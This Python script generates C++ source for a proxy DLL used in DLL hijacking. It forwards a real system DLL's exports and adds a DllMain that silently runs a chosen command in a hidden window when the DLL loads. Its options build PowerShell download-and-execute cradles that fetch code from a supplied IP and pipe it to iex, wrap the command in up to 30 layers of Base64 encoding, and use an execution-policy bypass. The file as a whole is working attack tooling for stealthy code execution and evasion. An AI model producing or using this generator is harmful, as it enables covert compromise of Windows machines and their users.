import pefile
import argparse
import os
import sys
import base64

def encode_ps(cmd):
    """Encode command in Base64 UTF-16LE for PowerShell -enc."""
    return base64.b64encode(cmd.encode("utf-16le")).decode()

def recursive_encode_ps(cmd, levels):
    """Recursively Base64-encode ONLY the content, not nested PS invocations."""
    if levels < 1:
        levels = 1
    if levels > 30:
        print("[-] ERROR: Max encoding depth is 30.")
        sys.exit(1)

    encoded = cmd
    for _ in range(levels):
        encoded = base64.b64encode(encoded.encode("utf-16le")).decode()

    return f"powershell -ep bypass -enc {encoded}"

def main():
    parser = argparse.ArgumentParser(description="Generate a proxy DLL")
    parser.add_argument("dll", help="Path to the DLL to generate a proxy for")
    parser.add_argument("--output", "-o", help="Generated C++ proxy file")
    parser.add_argument("--force-ordinals", "-v", action="store_true")

    # Custom opts
    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument("--ip", help="IP for downloads")
    parser.add_argument("--down", help="Download file but do NOT execute")
    parser.add_argument("--downexe", help="Download AND execute via IEX")
    parser.add_argument("--enc", type=int, help="Recursive Base64 PS encoding depth")

    args = parser.parse_args()

    dll: str = args.dll
    output: str = args.output

    user_cmd: str = args.cmd
    user_ip: str = args.ip or "0.0.0.0"
    user_down: str = args.down
    user_downexe: str = args.downexe
    enc_depth: int = args.enc

    # PRIORITY SYSTEM
    if user_downexe:
        user_cmd = (
            f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}') | iex"
        )
    elif user_down:
        user_cmd = (
            f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_down}')"
        )
    elif user_cmd is None:
        user_cmd = "echo NoCommandProvided"

    # Apply recursive encoding if enabled
    if enc_depth:
        final_ps = recursive_encode_ps(user_cmd, enc_depth)
        final_cmd = f"cmd.exe /c {final_ps}"
    else:
        final_cmd = f"cmd.exe /c {user_cmd}"

    basename = os.path.basename(dll)

    if output is None:
        file, _ = os.path.splitext(basename)
        output = f"{file}.cpp"

    if not os.path.exists(dll) and not os.path.isabs(dll):
        dll = os.path.join(os.environ["SystemRoot"], "System32", dll)

    if not os.path.exists(dll):
        print(f"File not found: {dll}")
        sys.exit(1)

    pe = pefile.PE(dll)
    regular_exports, com_exports, ordinal_exports = [], [], []
    
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        ordinal = exp.ordinal
        if exp.name is None:
            ordinal_exports.append((f"__proxy{ordinal}", ordinal))
        else:
            name = exp.name.decode()
            if name in {
                "DllCanUnloadNow","DllGetClassObject","DllInstall",
                "DllRegisterServer","DllUnregisterServer"
            }:
                com_exports.append(name)
            else:
                regular_exports.append(name)

    with open(output, "w") as f:

        f.write(f'#define TARGET_IP "{user_ip}"\n')
        f.write("#include <Windows.h>\n\n")

        macros = []
        if regular_exports:
            macros.append(
                f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func'
            )
        if com_exports:
            macros.append(
                f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func ",PRIVATE"'
            )
        if ordinal_exports:
            macros.append(
                f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}.#" #ord ",@" #ord ",NONAME"'
            )

        macros_32 = []
        if regular_exports:
            macros_32.append(
                f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func'
            )
        if com_exports:
            macros_32.append(
                f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func ",PRIVATE"'
            )
        if ordinal_exports:
            macros_32.append(
                f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}.#" #ord ",@" #ord ",NONAME"'
            )

        if macros:
            f.write("#ifdef _WIN64\n")
            for m in macros: f.write(m + "\n")
            f.write("#else\n")
            for m in macros_32: f.write(m + "\n")
            f.write("#endif\n\n")

        for e in regular_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT(\"{e}\"))\n")
        for e in com_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_PRIVATE(\"{e}\"))\n")
        for e, o in ordinal_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_ORDINAL(\"{e}\", {o}))\n")

        # ---- DllMain with final command ----
        f.write(f"""
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{{
    switch (fdwReason)
    {{
        case DLL_PROCESS_ATTACH:
        {{
            STARTUPINFOA si = {{ 0 }};
            PROCESS_INFORMATION pi = {{ 0 }};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            CreateProcessA(
                NULL,
                (LPSTR)"{final_cmd}",
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
        }}
        break;
    }}
    return TRUE;
}}
""")

if __name__ == "__main__":
    main()
